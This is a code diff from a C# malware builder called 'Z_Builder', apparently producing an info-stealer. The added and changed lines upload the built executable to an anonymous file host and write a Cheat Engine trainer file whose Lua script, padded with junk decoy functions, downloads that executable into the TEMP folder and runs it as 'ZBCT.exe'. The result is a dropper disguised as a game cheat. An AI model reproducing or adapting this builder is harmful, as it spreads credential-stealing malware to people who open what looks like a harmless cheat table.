@@ -172,13 +172,15 @@ namespace Z_Builder
             p.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
             p.Start();
             p.WaitForExit();
+            string StealerBasePath = Environment.ExpandEnvironmentVariables("%TEMP") + "\\StealerBase.exe";
+            try { File.Delete(StealerBasePath); } catch { }
             if (metroCheckBox8.Checked == true)
             {
                 using (AnonFileWrapper anonFileWrapper = new AnonFileWrapper())
                 {
                     AnonFile anonFile = anonFileWrapper.UploadFile(path);
                     string DownloadPath = anonFileWrapper.GetDirectDownloadLinkFromLink(anonFile.FullUrl);
-                    string CetrainerCode = "function lolokieZ(boops)local beepboop = (5*3-2/8+9*2/9+8*3) end function lolokieZ(blahblah)local beepboop = (5*3-2/8+9*2/9+8*3) end local beepboop = (5*3-2/8+9*2/9+8*3) local url = '" + DownloadPath + "'local a= getInternet()local test = a.getURL(url)local location = os.getenv('TEMP')local file = io.open(location..'\\\\setfont.exe', 'wb')file:write(test)file:close()shellExecute(location..'\\\\setfont.exe')";
+                    string CetrainerCode = "function lolokieZ(boops)local beepboop = (5*3-2/8+9*2/9+8*3) end function lolokieZ(blahblah)local beepboop = (5*3-2/8+9*2/9+8*3) end local beepboop = (5*3-2/8+9*2/9+8*3) local url = '" + DownloadPath + "'local a= getInternet()local test = a.getURL(url)local location = os.getenv('TEMP')local file = io.open(location..'\\\\ZBCT.exe', 'wb')file:write(test)file:close()shellExecute(location..'\\\\ZBCT.exe')";
                     string path2 = Path.GetDirectoryName(path) + "\\" + Path.GetFileNameWithoutExtension(path) + ".CETRAINER";
                     File.WriteAllText(path2, "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<CheatTable CheatEngineTableVersion=\"29\">\n  <CheatEntries/>\n  <UserdefinedSymbols/>\n  <LuaScript>\n" + CetrainerCode + "\n</LuaScript>\n</CheatTable>");
                 }
